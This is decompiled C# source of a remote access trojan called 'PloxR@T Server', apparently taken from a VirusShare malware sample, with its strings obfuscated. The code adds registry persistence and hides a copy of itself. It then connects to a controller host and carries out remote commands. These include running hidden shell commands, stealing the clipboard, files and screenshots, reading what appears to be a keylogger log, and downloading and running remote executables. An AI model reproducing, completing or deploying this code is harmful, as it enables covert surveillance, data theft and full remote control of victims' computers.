// Decompiled with JetBrains decompiler
// Type: .
// Assembly: PloxR@T Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=698412109f987773
// MVID: 2E09760C-A660-44B9-9687-856D82185CB8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scar.kkhn-c7e8ee1985f1efccae0c5553fa94e5908ed9436f7dd33e0ed77f3e5a8fbfa698.exe

using \u0001;
using \u0004;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace \u0004
{
  internal static class \u0002
  {
    public static TcpClient \u0001;
    public static StreamReader \u0001;
    public static StreamWriter \u0001;
    private static string \u0001 = \u0002.\u0003(39293);
    private static string \u0002 = \u0002.\u0003(38413);
    public static StringBuilder \u0001 = new StringBuilder();
    private static string \u0003 = \u0002.\u0003(38413);
    private static string \u0004;

    private static void \u0003()
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(\u0002.\u0003(38283), RegistryKeyPermissionCheck.ReadWriteSubTree);
        subKey.SetValue(\u0002.\u0003(38344), (object) (Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38366)), RegistryValueKind.String);
        subKey.Close();
      }
      catch
      {
      }
      if (!System.IO.File.Exists(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38366)))
        System.IO.File.Copy(Application.ExecutablePath, Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38366));
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      System.IO.File.SetAttributes(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38366), FileAttributes.Hidden);
      System.IO.File.SetAttributes(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38366), FileAttributes.System);
      System.IO.File.SetAttributes(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38366), FileAttributes.ReadOnly);
      string Expression = Strings.Space((int) FileSystem.LOF(1));
      FileSystem.FileGet(1, ref Expression);
      FileSystem.FileClose(1);
      string[] strArray1 = Strings.Split(Expression, \u0002.\u0003(38383));
      if (!System.IO.File.Exists(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38392)))
      {
        FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38392), FileMode.OpenOrCreate);
        fileStream.Write(\u0004.\u0001.\u0003(), 0, \u0004.\u0001.\u0003().Length);
        fileStream.Close();
      }
      Process.Start(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38392));
label_7:
      while (true)
      {
        try
        {
          \u0002.\u0001 = new TcpClient(strArray1[1], Convert.ToInt32(strArray1[2]));
          break;
        }
        catch
        {
        }
      }
      \u0002.\u0001 = new StreamWriter((Stream) \u0002.\u0001.GetStream());
      \u0002.\u0001 = new StreamReader((Stream) \u0002.\u0001.GetStream());
      string str1 = Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();
      string str2 = \u0002.\u0003(38413);
      foreach (DriveInfo drive in DriveInfo.GetDrives())
        str2 = str2 + drive.Name.Substring(0, 2) + \u0002.\u0003(38414);
      string str3 = Environment.OSVersion.VersionString;
      if (str3.Contains(\u0002.\u0003(38423)))
        str3 = \u0002.\u0003(38428);
      if (str3.Contains(\u0002.\u0003(38445)))
        str3 = \u0002.\u0003(38450);
      if (str3.Contains(\u0002.\u0003(38471)))
        str3 = \u0002.\u0003(38476);
      \u0002.\u0001.WriteLine(\u0002.\u0003(38493) + Environment.MachineName + \u0002.\u0003(38506) + str3 + \u0002.\u0003(38506) + str1 + \u0002.\u0003(38506) + str2);
      \u0002.\u0001.Flush();
      while (true)
      {
        string[] strArray2;
        do
        {
          string input;
          try
          {
            string str4;
            do
            {
              do
              {
                str4 = \u0002.\u0001.ReadLine();
              }
              while (str4 == null || !(str4 != \u0002.\u0003(38413)));
            }
            while ((input = str4) == null);
          }
          catch
          {
            goto label_7;
          }
          strArray2 = Regex.Split(input, \u0002.\u0003(38506));
          if (strArray2[0] == \u0002.\u0003(38515))
          {
            try
            {
              string str5 = Process.Start(new ProcessStartInfo(\u0002.\u0003(38528), \u0002.\u0003(38541))
              {
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
              }).StandardOutput.ReadToEnd().Replace(Environment.NewLine, \u0002.\u0003(38562));
              \u0002.\u0001.WriteLine(\u0002.\u0003(38567) + str5);
              \u0002.\u0001.Flush();
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38580))
          {
            try
            {
              string str6 = Process.Start(new ProcessStartInfo(\u0002.\u0003(38528), \u0002.\u0003(38585) + strArray2[1])
              {
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
              }).StandardOutput.ReadToEnd().Replace(Environment.NewLine, \u0002.\u0003(38562));
              \u0002.\u0001.WriteLine(\u0002.\u0003(38590) + str6);
              \u0002.\u0001.Flush();
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38603))
          {
            try
            {
              \u0002.\u0003(\u0002.\u0001 + \u0002.\u0003(38612));
              \u0002.\u0004(\u0002.\u0001 + \u0002.\u0003(38612));
              \u0002.\u0001.WriteLine(\u0002.\u0003(38617) + \u0002.\u0002);
              \u0002.\u0001.Flush();
              \u0002.\u0002 = \u0002.\u0003(38413);
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38626))
          {
            try
            {
              Process.Start(\u0002.\u0003(38639));
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38660))
          {
            try
            {
              Process.Start(\u0002.\u0003(38673));
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38694))
          {
            try
            {
              string[] strArray3 = Strings.Split(new StreamReader(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(38612) + Environment.UserName + \u0002.\u0003(38703) + Environment.MachineName + \u0002.\u0003(38708)).ReadToEnd(), Environment.NewLine, Compare: CompareMethod.Text);
              string str7 = \u0002.\u0003(38413);
              foreach (string str8 in strArray3)
                str7 = str7 + str8 + \u0002.\u0003(38562);
              \u0002.\u0001.WriteLine(\u0002.\u0003(38717) + str7);
              \u0002.\u0001.Flush();
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38734))
          {
            try
            {
              Process.Start(\u0002.\u0003(38743));
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38764))
          {
            try
            {
              Process.Start(\u0002.\u0003(38777) + strArray2[1]);
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38806))
          {
            try
            {
              Process.Start(\u0002.\u0003(38819) + strArray2[1]);
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38840))
          {
            try
            {
              \u0002.\u0001 = strArray2[1];
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38849))
          {
            try
            {
              new WebClient().DownloadFile(strArray2[1], strArray2[2]);
              Process process = new Process();
              process.StartInfo.FileName = strArray2[2];
              if (strArray2[3] == \u0002.\u0003(38862))
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
              process.Start();
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38871))
          {
            try
            {
              Process.Start(\u0002.\u0001 + \u0002.\u0003(38612) + strArray2[1]);
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38880))
          {
            try
            {
              Directory.CreateDirectory(strArray2[1]);
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38889))
          {
            try
            {
              System.IO.File.Delete(strArray2[1]);
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38898))
          {
            try
            {
              System.IO.File.Copy(\u0002.\u0001 + \u0002.\u0003(38612) + strArray2[2], \u0002.\u0001 + \u0002.\u0003(38612) + strArray2[1]);
              System.IO.File.Delete(\u0002.\u0001 + \u0002.\u0003(38612) + strArray2[2]);
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38907))
          {
            try
            {
              Directory.Delete(strArray2[1]);
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38920))
          {
            try
            {
              \u0002.\u0001.WriteLine(\u0002.\u0003(38933) + Clipboard.GetText());
              \u0002.\u0001.Flush();
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38946))
          {
            if (strArray2[3] == \u0002.\u0003(38951))
            {
              int num1 = (int) MessageBox.Show(strArray2[1], strArray2[2], MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
            if (strArray2[3] == \u0002.\u0003(38960))
            {
              int num2 = (int) MessageBox.Show(strArray2[1], strArray2[2], MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            if (strArray2[3] == \u0002.\u0003(38969))
            {
              int num3 = (int) MessageBox.Show(strArray2[1], strArray2[2], MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            if (strArray2[3] == \u0002.\u0003(38978))
            {
              int num4 = (int) MessageBox.Show(strArray2[1], strArray2[2], MessageBoxButtons.OK);
            }
          }
          else if (strArray2[0] == \u0002.\u0003(38987))
          {
            try
            {
              Clipboard.SetText(strArray2[1]);
            }
            catch
            {
            }
          }
          else if (strArray2[0] == \u0002.\u0003(39000))
          {
            string str9 = \u0002.\u0003(38413);
            foreach (DriveInfo drive in DriveInfo.GetDrives())
              str9 = str9 + drive.Name + \u0002.\u0003(38562);
            \u0002.\u0001.WriteLine(\u0002.\u0003(39009) + str9);
            \u0002.\u0001.Flush();
          }
          else
          {
            if (strArray2[0] == \u0002.\u0003(39022))
            {
              try
              {
                Registry.CurrentUser.OpenSubKey(\u0002.\u0003(39031), RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(\u0002.\u0003(39156));
                Application.Exit();
              }
              catch
              {
                Application.Exit();
              }
            }
            if (strArray2[0] == \u0002.\u0003(39169))
            {
              foreach (Process process in Process.GetProcesses())
                \u0002.\u0003 = \u0002.\u0003 + process.ProcessName + \u0002.\u0003(38562);
              \u0002.\u0001.WriteLine(\u0002.\u0003(39178) + \u0002.\u0003);
              \u0002.\u0001.Flush();
              \u0002.\u0003 = \u0002.\u0003(38413);
            }
            else if (strArray2[0] == \u0002.\u0003(39191))
            {
              try
              {
                FileStream fileStream = new FileStream(strArray2[1], FileMode.Open);
                byte[] numArray = new byte[fileStream.Length];
                fileStream.Read(numArray, 0, numArray.Length);
                \u0002.\u0004 = Convert.ToBase64String(numArray);
                \u0002.\u0001.WriteLine(\u0002.\u0003(39200) + \u0002.\u0004);
                \u0002.\u0001.Flush();
              }
              catch
              {
              }
            }
            else if (strArray2[0] == \u0002.\u0003(39213))
            {
              \u0002.\u0004();
              FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(39222), FileMode.OpenOrCreate);
              byte[] numArray = new byte[fileStream.Length];
              fileStream.Read(numArray, 0, numArray.Length);
              fileStream.Close();
              \u0002.\u0004 = Convert.ToBase64String(numArray);
              \u0002.\u0001.WriteLine(\u0002.\u0003(39200) + \u0002.\u0004);
              \u0002.\u0001.Flush();
            }
            else if (strArray2[0] == \u0002.\u0003(39231))
            {
              \u0002.\u0001.AppendLine(strArray2[1]);
              byte[] buffer = Convert.FromBase64String(\u0002.\u0001.ToString());
              FileStream fileStream = new FileStream(strArray2[2], FileMode.OpenOrCreate);
              fileStream.Write(buffer, 0, buffer.Length);
              fileStream.Close();
              \u0002.\u0001.Remove(0, \u0002.\u0001.Length);
            }
            else if (strArray2[0] == \u0002.\u0003(39240))
            {
              long length = new FileInfo(strArray2[1]).Length;
              long num5 = length / 1000L;
              long num6 = length / 1000000L;
              \u0002.\u0001.WriteLine(\u0002.\u0003(39249) + (object) num5 + \u0002.\u0003(38506) + (object) num6);
              \u0002.\u0001.Flush();
            }
          }
        }
        while (!(strArray2[0] == \u0002.\u0003(39262)));
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName == strArray2[1])
              process.Kill();
          }
        }
        catch
        {
        }
      }
    }

    private static void \u0003([In] string obj0)
    {
      try
      {
        string[] directories = Directory.GetDirectories(obj0);
        \u0002.\u0002 += \u0002.\u0003(39275);
        for (int index = 0; index <= directories.Length - 1; ++index)
        {
          string[] strArray = Strings.Split(directories[index], \u0002.\u0003(38612), Compare: CompareMethod.Text);
          \u0002.\u0002 = \u0002.\u0002 + \u0002.\u0003(39284) + strArray[strArray.Length - 1] + \u0002.\u0003(38562);
        }
      }
      catch
      {
      }
    }

    private static void \u0004([In] string obj0)
    {
      try
      {
        FileInfo[] files = new DirectoryInfo(obj0).GetFiles();
        for (int index = 0; index <= files.Length - 1; ++index)
          \u0002.\u0002 = \u0002.\u0002 + files[index].Name + \u0002.\u0003(38562);
      }
      catch
      {
      }
    }

    private static void \u0004()
    {
      int width = Screen.GetBounds(new Point(0, 0)).Width;
      int height = Screen.GetBounds(new Point(0, 0)).Height;
      Bitmap bitmap = new Bitmap(width, height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(0, 0, 0, 0, new Size(width, height));
      if (System.IO.File.Exists(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(39222)))
      {
        try
        {
          System.IO.File.Delete(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(39222));
        }
        catch
        {
        }
      }
      bitmap.Save(Environment.GetEnvironmentVariable(\u0002.\u0003(38357)) + \u0002.\u0003(39222), ImageFormat.Jpeg);
    }
  }
}
